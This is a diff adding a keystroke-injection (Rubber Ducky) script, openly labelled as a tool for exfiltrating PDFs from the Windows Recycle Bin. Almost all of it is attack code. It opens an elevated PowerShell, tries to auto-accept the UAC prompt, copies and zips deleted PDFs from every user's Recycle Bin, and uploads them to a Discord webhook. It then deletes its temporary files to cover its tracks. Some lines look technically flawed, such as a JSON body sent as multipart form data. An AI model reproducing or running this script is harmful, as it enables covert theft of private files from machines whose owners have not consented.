@@ -1,1 +1,90 @@
+REM Ducky Script for exfiltrating PDFs from Recycle Bin and sending via Discord Webhook
+REM made with a good heart
+REM Define the Discord webhook URL
+REM Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL.
+SET DISCORD_WEBHOOK_URL="YOUR_DISCORD_WEBHOOK_URL"
 
+REM Define output file and temporary directory for zipping
+SET OUTPUT_ZIP="C:\Users\Public\RecycleBinPDFs.zip"
+SET TEMP_DIR="C:\Users\Public\TempExfil"
+
+REM Ducky Script starts here
+DELAY 500
+
+REM Open PowerShell (Admin) - for full access to Recycle Bin contents
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -Command "Start-Process powershell -Verb RunAs"
+ENTER
+DELAY 2000
+ALT y REM Acknowledge UAC prompt if it appears
+
+DELAY 1000
+
+REM Wait for PowerShell window to load, then execute initial commands
+STRING $DISCORD_WEBHOOK_URL = '%DISCORD_WEBHOOK_URL%';
+ENTER
+STRING $OUTPUT_ZIP_PATH = '%OUTPUT_ZIP%';
+ENTER
+STRING $TEMP_DIR_PATH = '%TEMP_DIR%';
+ENTER
+
+REM Create temporary directory if it doesn't exist
+STRING New-Item -ItemType Directory -Path $TEMP_DIR_PATH -Force;
+ENTER
+
+REM Find Recycle Bin items. The Recycle Bin is typically located at $Recycle.Bin.
+REM We need to enumerate all SID subfolders within $Recycle.Bin to find user-specific recycle bins.
+REM Then, we look for PDF files within these folders.
+REM The actual file paths inside the Recycle Bin are obfuscated, so we'll copy them to a known temp location first.
+
+STRING $recycleBinPath = '$env:SystemDrive\$Recycle.Bin';
+ENTER
+
+REM Get all PDF files from all user Recycle Bins
+STRING $pdfFiles = Get-ChildItem -Path $recycleBinPath -Recurse -File -Include "*.pdf" -ErrorAction SilentlyContinue;
+ENTER
+
+REM Copy found PDFs to the temporary directory
+STRING foreach ($file in $pdfFiles) { Copy-Item -Path $file.FullName -Destination $TEMP_DIR_PATH -Force };
+ENTER
+
+REM Check if any PDFs were found and copied
+STRING if ((Get-Childitem -Path $TEMP_DIR_PATH -Filter "*.pdf").Count -gt 0) {
+ENTER
+STRING     Compress-Archive -Path "$TEMP_DIR_PATH\*.pdf" -DestinationPath $OUTPUT_ZIP_PATH -Force;
+ENTER
+STRING     $filePath = $OUTPUT_ZIP_PATH;
+ENTER
+STRING     $fileContent = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($filePath));
+ENTER
+STRING     $fileName = [System.IO.Path]::GetFileName($filePath);
+ENTER
+STRING     $jsonPayload = @{"file"= @{"attachment"= $fileContent; "name"= $fileName}} | ConvertTo-Json;
+ENTER
+STRING     Invoke-RestMethod -Uri $DISCORD_WEBHOOK_URL -Method Post -ContentType "multipart/form-data" -Body $jsonPayload;
+ENTER
+STRING     Remove-Item $OUTPUT_ZIP_PATH -ErrorAction SilentlyContinue;
+ENTER
+STRING     Remove-Item $TEMP_DIR_PATH -Recurse -Force -ErrorAction SilentlyContinue;
+ENTER
+STRING     Exit;
+ENTER
+STRING } else {
+ENTER
+STRING     Remove-Item $TEMP_DIR_PATH -Recurse -Force -ErrorAction SilentlyContinue;
+ENTER
+STRING     Write-Host "No PDF files found in Recycle Bin.";
+ENTER
+STRING     Exit;
+ENTER
+STRING };
+ENTER
+
+REM Clean up by removing the temporary directory and zip file
+STRING Remove-Item $OUTPUT_ZIP_PATH -ErrorAction SilentlyContinue;
+ENTER
+STRING Remove-Item $TEMP_DIR_PATH -Recurse -Force -ErrorAction SilentlyContinue;
+ENTER
+STRING Exit;
+ENTER
